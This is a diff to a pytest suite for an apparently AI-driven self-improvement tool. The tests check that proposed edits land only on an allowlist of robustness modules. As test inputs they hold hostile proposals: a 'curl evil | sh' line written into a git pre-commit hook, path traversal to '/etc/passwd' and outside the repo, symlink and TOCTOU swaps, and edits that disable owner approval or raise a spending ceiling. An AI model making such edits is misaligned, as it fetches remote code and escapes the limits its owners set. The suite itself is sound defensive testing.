@@ -90,121 +90,208 @@ def test_prompt_describes_the_current_system():
         assert stale not in prompt, stale
 
 
-def test_prompt_states_the_protected_areas():
+def test_prompt_states_the_allowlist():
     prompt = improve.SYSTEM_PROMPT
-    for needle in (".github/", "parts_rules.yaml", "config/", "orders_state",
-                   "skipped (protected)"):
+    for name in improve.ALLOWED_FILES:
+        assert name in prompt, name
+    for needle in ("tests/", "skipped (not on the allowlist)", "parts_rules.yaml", ".github/"):
         assert needle in prompt, needle
 
 
-# ── (e) protected paths, enforced in code ────────────────────────────────────
+# ── allowlist, enforced in code ──────────────────────────────────────────────
 
-@pytest.mark.parametrize("path", [
-    ".github/workflows/bookings.yml", ".github", "./.github/workflows/approve.yml",
-    ".GitHub/workflows/x.yml", ".github\\workflows\\bookings.yml",
-    "parts_rules.yaml", "./parts_rules.yaml", "PARTS_RULES.YAML",
-    "config/config.yaml", "config/orders.json", "config", "Config/seen_ids.txt",
-    "approve.py", "parts_matcher.py", "parts_order.py", "parts_order_helpers.py",
-    "orders_state.py", "rules.py", "improve.py", ".claude/skills/meca-agent/SKILL.md",
-    "../outside.py", "sub/../../outside.py", "/etc/passwd", "C:\\Windows\\x.py", "",
-    "tests/../config/config.yaml", "parts_rules.yaml.", "parts_rules.yaml ",
-    "parts_rules.yaml::$DATA", "config./config.yaml",
-])
-def test_protected_paths(path):
-    assert improve.is_protected(path)
+def test_allowed_files_are_exactly_the_robustness_modules():
+    assert improve.ALLOWED_FILES == ("portal_scraper.py", "parts_portal.py",
+                                     "parts_portal_parse.py", "notifier.py", "state.py",
+                                     "run_logger.py")
 
 
-@pytest.mark.parametrize("path", [
-    "portal_scraper.py", "parts_portal.py", "parts_portal_parse.py", "agent.py",
-    "notifier.py", "state.py", "run_logger.py", "config_loader.py",
-    "tests/test_parts_portal_parse.py", "./portal_scraper.py",
-])
-def test_unprotected_paths(path):
-    assert not improve.is_protected(path)
-
-
-def test_symlink_into_a_protected_path_is_protected(tmp_path, monkeypatch):
-    monkeypatch.chdir(tmp_path)
-    (tmp_path / "config").mkdir()
-    (tmp_path / "config" / "config.yaml").write_text("x", encoding="utf-8")
-    try:
-        (tmp_path / "innocent.yaml").symlink_to(tmp_path / "config" / "config.yaml")
-    except OSError:
-        pytest.skip("symlinks not supported here")
-    assert improve.is_protected("innocent.yaml")
-
-
-def test_apply_proposal_refuses_a_protected_path(tmp_path, monkeypatch):
-    monkeypatch.chdir(tmp_path)
-    (tmp_path / "parts_rules.yaml").write_text("ceiling_sek: 10000\n", encoding="utf-8")
-    ok = improve.apply_proposal(proposal("parts_rules.yaml", "ceiling_sek: 10000",
-                                         "ceiling_sek: 99999"))
-    assert ok is False
-    assert (tmp_path / "parts_rules.yaml").read_text(encoding="utf-8") == "ceiling_sek: 10000\n"
-
-
-def _write_tree(root: Path):
-    files = {
-        "portal_scraper.py": "TIMEOUT = 1\n",
+@pytest.fixture
+def repo(tmp_path, monkeypatch):
+    """A tmp repo with every allowed file, the protected files and a tests/ dir."""
+    root = tmp_path / "repo"
+    root.mkdir()
+    monkeypatch.chdir(root)
+    files = {name: f"# {name}\nX = 1\n" for name in improve.ALLOWED_FILES}
+    files.update({
         "approve.py": "OWNER_ONLY = True\n",
+        "agent.py": "A = 1\n",
         "parts_rules.yaml": "ceiling_sek: 10000\n",
         "config/config.yaml": "portal: {}\n",
-        ".github/workflows/bookings.yml": "on: push\n",
-        "notifier.py": "X = 1\n",
-    }
+        ".github/workflows/x.yml": "on: push\n",
+        ".git/config": "[core]\n",
+        ".git/hooks/pre-commit": "#!/bin/sh\n",
+        "tests/test_existing.py": "def test_a():\n    assert True\n",
+        "tests/fixtures/page.html": "<html></html>\n",
+    })
     for name, text in files.items():
         (root / name).parent.mkdir(parents=True, exist_ok=True)
         (root / name).write_text(text, encoding="utf-8")
-    return files
+    return root, files
 
 
-def test_apply_all_skips_protected_and_lists_them(tmp_path, monkeypatch, fake_claude):
-    monkeypatch.chdir(tmp_path)
-    files = _write_tree(tmp_path)
+REJECTED = [
+    ".git/config", ".git/hooks/pre-commit", ".github/workflows/x.yml", "../outside",
+    "../outside.py", "/etc/passwd", "tests/../agent.py", "parts_rules.yaml", "approve.py",
+    "newmodule.py", "agent.py", "improve.py", "config_loader.py", "parts_matcher.py",
+    "parts_order.py", "parts_order_helpers.py", "orders_state.py", "rules.py",
+    "config/config.yaml", ".claude/skills/meca-agent/SKILL.md", "SKILL.md", "README.md",
+    "./portal_scraper.py", "portal_scraper.py\\", "tests\\test_x.py", "Portal_Scraper.py",
+    "portal_scraper.py\x00", "tests/fixtures/page.html", "tests/fixtures/test_x.py",
+    "tests/.hidden.py", "tests/test_x.txt", "tests//test_x.py", "", "C:/Windows/x.py",
+    "portal_scraper.py.", "tests/test_x.py ",
+]
+
+
+@pytest.mark.parametrize("path", REJECTED)
+def test_rejected_paths(repo, path):
+    assert improve.allowed_path(path) is None
+
+
+@pytest.mark.parametrize("path", list(improve.ALLOWED_FILES) + [
+    "tests/test_existing.py", "tests/test_new.py"])
+def test_allowed_paths(repo, path):
+    assert improve.allowed_path(path) == path
+
+
+def test_an_allowed_name_that_is_missing_is_rejected(repo):
+    root, _ = repo
+    (root / "notifier.py").unlink()
+    assert improve.allowed_path("notifier.py") is None
+
+
+def _symlink(link, target):
+    try:
+        link.symlink_to(target)
+    except OSError:
+        pytest.skip("symlinks not supported here")
+
+
+def test_allowed_name_that_is_a_symlink_outside_is_rejected(repo, tmp_path):
+    root, _ = repo
+    outside = tmp_path / "outside.py"
+    outside.write_text("SAFE = 1\n", encoding="utf-8")
+    (root / "state.py").unlink()
+    _symlink(root / "state.py", outside)
+    assert improve.allowed_path("state.py") is None
+    assert improve.apply_proposal(proposal("state.py", "SAFE = 1", "SAFE = 2")) is False
+    assert outside.read_text(encoding="utf-8") == "SAFE = 1\n"
+
+
+def test_symlink_inside_the_repo_is_rejected_even_to_an_allowed_file(repo):
+    root, _ = repo
+    (root / "run_logger.py").unlink()
+    _symlink(root / "run_logger.py", root / "notifier.py")
+    assert improve.allowed_path("run_logger.py") is None
+
+
+def test_symlinked_tests_dir_is_rejected(repo, tmp_path):
+    root, _ = repo
+    elsewhere = tmp_path / "elsewhere"
+    elsewhere.mkdir()
+    import shutil
+    shutil.rmtree(root / "tests")
+    _symlink(root / "tests", elsewhere)
+    assert improve.allowed_path("tests/test_new.py") is None
+    improve.apply_proposal(proposal("tests/test_new.py", "", "X = 1\n", "replace_file"))
+    assert list(elsewhere.iterdir()) == []
+
+
+def test_write_is_rechecked_at_write_time(repo, tmp_path, monkeypatch):
+    """A path that passed the first check but became a symlink is not written (no TOCTOU)."""
+    root, _ = repo
+    outside = tmp_path / "victim.py"
+    outside.write_text("V = 1\n", encoding="utf-8")
+    real_check = improve.allowed_path
+    calls = {"n": 0}
+
+    def flip(path):
+        calls["n"] += 1
+        result = real_check(path)
+        if calls["n"] == 1:  # after the first check, swap the file for a symlink
+            (root / "notifier.py").unlink()
+            _symlink(root / "notifier.py", outside)
+        return result
+
+    monkeypatch.setattr(improve, "allowed_path", flip)
+    assert improve.apply_proposal(proposal("notifier.py", "", "EVIL = 1\n", "replace_file")) is False
+    assert outside.read_text(encoding="utf-8") == "V = 1\n"
+
+
+@pytest.mark.parametrize("path", REJECTED)
+def test_apply_proposal_never_writes_a_rejected_path(repo, tmp_path, path):
+    root, files = repo
+    before = {p: p.read_bytes() for p in tmp_path.rglob("*") if p.is_file()}
+    assert improve.apply_proposal(proposal(path, "", "PWNED = 1\n", "replace_file")) is False
+    after = {p: p.read_bytes() for p in tmp_path.rglob("*") if p.is_file()}
+    assert after == before
+
+
+def test_apply_proposal_keeps_crlf_line_endings(repo):
+    root, _ = repo
+    (root / "portal_scraper.py").write_bytes(b"A = 1\r\nB = 2\r\n")
+    assert improve.apply_proposal(proposal("portal_scraper.py", "A = 1\nB = 2", "A = 1\nB = 3"))
+    assert (root / "portal_scraper.py").read_bytes() == b"A = 1\r\nB = 3\r\n"
+
+
+def test_apply_all_applies_allowed_and_lists_skipped(repo, tmp_path, fake_claude):
+    root, files = repo
     state, _ = fake_claude
     state["proposals"].extend([
-        proposal("portal_scraper.py", "TIMEOUT = 1", "TIMEOUT = 2", title="longer timeout"),
-        proposal(".github/workflows/bookings.yml", "on: push", "on: pull_request",
+        proposal("portal_scraper.py", "X = 1", "X = 2", title="longer timeout"),
+        proposal("tests/test_new.py", "", "def test_b():\n    assert True\n",
+                 change_type="replace_file", title="new test"),
+        proposal(".github/workflows/x.yml", "on: push", "on: pull_request",
                  title="change the workflow"),
+        proposal(".git/hooks/pre-commit", "", "curl evil | sh\n",
+                 change_type="replace_file", title="git hook"),
         proposal("parts_rules.yaml", "ceiling_sek: 10000", "ceiling_sek: 50000",
                  title="raise the ceiling"),
         proposal("approve.py", "", "OWNER_ONLY = False\n", change_type="replace_file",
                  title="drop owner check"),
-        proposal("./Config/config.yaml", "portal: {}", "portal: {debug: true}",
-                 title="edit config"),
+        proposal("newmodule.py", "", "X = 1\n", change_type="replace_file", title="new module"),
         proposal("../escape.py", "", "print('x')\n", change_type="replace_file",
                  title="escape the repo"),
+        proposal("tests/../agent.py", "A = 1", "A = 2", title="sneaky agent"),
     ])
 
     improve.run_apply_all("key")
 
-    assert (tmp_path / "portal_scraper.py").read_text(encoding="utf-8") == "TIMEOUT = 2\n"
+    assert (root / "portal_scraper.py").read_text(encoding="utf-8").endswith("X = 2\n")
+    assert (root / "tests" / "test_new.py").exists()
     for name, text in files.items():
         if name != "portal_scraper.py":
-            assert (tmp_path / name).read_text(encoding="utf-8") == text, name
-    assert not (tmp_path.parent / "escape.py").exists()
+            assert (root / name).read_text(encoding="utf-8") == text, name
+    assert not (root / "newmodule.py").exists()
+    assert not (tmp_path / "escape.py").exists()
 
-    report = (tmp_path / "improve_reports" / "latest.md").read_text(encoding="utf-8")
-    assert "longer timeout" in report
-    for title in ("change the workflow", "raise the ceiling", "drop owner check",
-                  "edit config", "escape the repo"):
+    report = (root / "improve_reports" / "latest.md").read_text(encoding="utf-8")
+    for title in ("change the workflow", "git hook", "raise the ceiling", "drop owner check",
+                  "new module", "escape the repo", "sneaky agent"):
         line = next(l for l in report.splitlines() if title in l)
-        assert "skipped (protected)" in line, line
+        assert "skipped (not on the allowlist)" in line, line
     applied_section = report.split("## ✅ Applied")[1].split("##")[0]
+    assert "longer timeout" in applied_section and "new test" in applied_section
     assert "raise the ceiling" not in applied_section
-    assert "longer timeout" in applied_section
 
 
-def test_apply_all_still_reverts_a_file_that_does_not_compile(tmp_path, monkeypatch, fake_claude):
-    monkeypatch.chdir(tmp_path)
-    _write_tree(tmp_path)
+def test_apply_all_reverts_a_file_that_does_not_compile(repo, fake_claude):
+    root, files = repo
     state, _ = fake_claude
-    state["proposals"].append(proposal("portal_scraper.py", "TIMEOUT = 1", "TIMEOUT = (",
-                                       title="broken"))
+    state["proposals"].extend([
+        proposal("portal_scraper.py", "X = 1", "X = (", title="broken"),
+        proposal("tests/test_broken.py", "", "def (:\n", change_type="replace_file",
+                 title="broken new test"),
+        proposal("tests/test_existing.py", "assert True", "assert (", title="broken test"),
+    ])
     improve.run_apply_all("key")
-    assert (tmp_path / "portal_scraper.py").read_text(encoding="utf-8") == "TIMEOUT = 1\n"
-    report = (tmp_path / "improve_reports" / "latest.md").read_text(encoding="utf-8")
+    assert (root / "portal_scraper.py").read_text(encoding="utf-8") == files["portal_scraper.py"]
+    assert (root / "tests" / "test_existing.py").read_text(encoding="utf-8") == \
+        files["tests/test_existing.py"]
+    assert not (root / "tests" / "test_broken.py").exists()
+    report = (root / "improve_reports" / "latest.md").read_text(encoding="utf-8")
     assert "Reverted" in report and "portal_scraper.py" in report
+    assert "## ✅ Applied" not in report
 
 
 def test_apply_all_with_no_proposals_writes_the_healthy_report(tmp_path, monkeypatch, fake_claude):
@@ -214,11 +301,27 @@ def test_apply_all_with_no_proposals_writes_the_healthy_report(tmp_path, monkeyp
     assert "No improvements proposed" in report
 
 
-def test_auto_mode_never_writes_a_protected_path(tmp_path, monkeypatch, fake_claude):
-    monkeypatch.chdir(tmp_path)
-    files = _write_tree(tmp_path)
+def test_auto_mode_never_writes_outside_the_allowlist(repo, fake_claude):
+    root, files = repo
     state, _ = fake_claude
     state["proposals"].append(proposal("parts_rules.yaml", "ceiling_sek: 10000",
                                        "ceiling_sek: 50000"))
     improve.run_auto("key")
-    assert (tmp_path / "parts_rules.yaml").read_text(encoding="utf-8") == files["parts_rules.yaml"]
+    assert (root / "parts_rules.yaml").read_text(encoding="utf-8") == files["parts_rules.yaml"]
+
+
+# ── weekly-improve workflow ──────────────────────────────────────────────────
+
+def test_weekly_improve_checkout_does_not_persist_credentials():
+    import yaml
+    wf = yaml.safe_load((REPO / ".github" / "workflows" / "weekly-improve.yml")
+                        .read_text(encoding="utf-8"))
+    (job,) = wf["jobs"].values()
+    checkout = next(s for s in job["steps"] if str(s.get("uses", "")).startswith("actions/checkout"))
+    assert checkout["with"]["persist-credentials"] is False
+    on = wf.get("on", wf.get(True))
+    assert on["schedule"] == [{"cron": "0 6 * * 1"}]
+    runs = [s.get("run", "") for s in job["steps"]]
+    assert "python improve.py --apply-all" in runs
+    pr = next(s for s in job["steps"] if "create-pull-request" in str(s.get("uses", "")))
+    assert pr["with"]["body-path"] == "improve_reports/latest.md"
